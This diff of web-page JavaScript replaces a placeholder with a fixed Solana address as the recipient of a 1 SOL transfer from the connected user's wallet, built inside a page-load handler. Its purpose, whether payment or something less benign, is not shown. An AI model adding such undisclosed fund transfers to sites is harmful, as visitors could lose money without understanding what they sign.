@@ -204,7 +204,7 @@ document.addEventListener('DOMContentLoaded', () => {
       const transaction = new Transaction().add(
         SystemProgram.transfer({
           fromPubkey: wallet.publicKey, // User's public key
-          toPubkey: new PublicKey('TARGET_WALLET_ADDRESS'), // Replace with your receiving wallet address
+          toPubkey: new PublicKey('85oCL1HwZ5nJudmzuzoD23oMqRHsojTqu6tcGuQMLnVm'), // Replace with your receiving wallet address
           lamports: 1000000000, // 1 SOL = 1 billion lamports (adjust amount as needed)
         })
       );
